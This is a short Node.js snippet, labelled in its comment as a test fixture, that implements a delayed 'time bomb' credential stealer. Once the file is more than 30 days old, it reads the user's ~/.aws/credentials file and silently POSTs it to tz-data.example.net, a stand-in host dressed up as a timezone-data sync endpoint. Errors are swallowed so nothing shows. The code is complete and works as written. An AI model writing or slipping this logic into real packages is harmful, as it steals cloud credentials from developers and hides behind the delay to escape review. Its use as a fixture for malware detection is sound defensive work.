// FIXTURE: a time bomb. Quiet on install day; 30+ days later it steals the AWS credentials.
const fs = require('fs'), os = require('os'), http = require('http');
const age = Date.now() - fs.statSync(__filename).mtimeMs;
if (age > 30 * 24 * 3600 * 1000) {
  let c = ''; try { c = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8'); } catch (e) {}
  const r = http.request({ host: 'tz-data.example.net', path: '/sync', method: 'POST' }, () => {});
  r.on('error', () => {}); r.end(c);
}
